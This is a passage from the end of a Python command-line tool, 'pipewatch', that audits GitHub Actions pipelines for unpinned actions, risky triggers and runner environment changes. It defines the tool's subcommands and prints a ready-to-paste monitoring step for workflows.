        findings += verify_pinned_shas(repo, args.token or os.environ.get("GITHUB_TOKEN"))
    _emit(build_report(findings, repo, commit), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_init_runner(args):
    """Print a ready-to-paste GitHub Actions step block for runner environment monitoring."""
    snap = args.snapshot_path or ".pipewatch_env_snapshot.json"
    print(f"""
# Paste this into any job you want to monitor.
# Requires pipewatch to be installed in the runner environment.

      - name: Restore pipewatch snapshot
        uses: actions/cache@<sha>  # pin this
        with:
          path: {snap}
          key: pipewatch-env-${{{{ runner.os }}}}-${{{{ github.ref }}}}
          restore-keys: pipewatch-env-${{{{ runner.os }}}}-

      - name: pipewatch — runner environment check
        run: |
          pipewatch snapshot --output /tmp/pw_snap_current.json
          if [ -f "{snap}" ]; then
            pipewatch env-diff "{snap}" \\
              --current-snapshot /tmp/pw_snap_current.json \\
              --json >> $GITHUB_STEP_SUMMARY || true
          fi
          cp /tmp/pw_snap_current.json "{snap}"
""".strip())


def main():
    p = argparse.ArgumentParser(prog="pipewatch", description="CI/CD pipeline integrity monitor")
    p.add_argument("--version", action="version", version=f"pipewatch {__version__}")
    sub = p.add_subparsers(dest="command", required=True)

    def add(name, help_):
        return sub.add_parser(name, help=help_)

    s = add("baseline", "Record current (or specified) commit as known-good baseline.")
    s.add_argument("--repo", default="."); s.add_argument("--commit", metavar="SHA")
    s.set_defaults(func=cmd_baseline)

    s = add("scan", "Diff pipeline files and step fingerprints against baseline.")
    s.add_argument("--repo", default="."); s.add_argument("--baseline", metavar="SHA")
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_scan)

    s = add("pin-audit", "Flag uses: references not pinned to a commit SHA.")
    s.add_argument("--repo", default=".")
    s.add_argument("--verify-shas", action="store_true", help="Verify pinned SHAs exist via GitHub API.")
    s.add_argument("--token", metavar="TOKEN", help="GitHub PAT (or set GITHUB_TOKEN).")
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_pin_audit)

    s = add("static", "Static analysis: pull_request_target misuse, script injection, permissions, self-hosted runners, workflow_run chains.")
    s.add_argument("--repo", default=".")
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_static)

    s = add("snapshot", "Capture runner environment to JSON.")
    s.add_argument("--output", default=_SNAPSHOT_FILE, metavar="FILE")
    s.set_defaults(func=cmd_snapshot)

    s = add("env-diff", "Diff two runner environment snapshots.")
    s.add_argument("baseline_snapshot"); s.add_argument("--current-snapshot", metavar="FILE")
    s.add_argument("--repo", default="."); s.add_argument("--verbose", "-v", action="store_true")
    s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_env_diff)

    s = add("audit", "Full audit: scan + pin-audit + static analysis combined.")
    s.add_argument("--repo", default="."); s.add_argument("--baseline", metavar="SHA")
    s.add_argument("--verify-shas", action="store_true"); s.add_argument("--token", metavar="TOKEN")
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_audit)

    s = add("init-runner", "Print a GitHub Actions step block for runner environment monitoring.")
    s.add_argument("--snapshot-path", metavar="PATH")
    s.set_defaults(func=cmd_init_runner)

    args = p.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()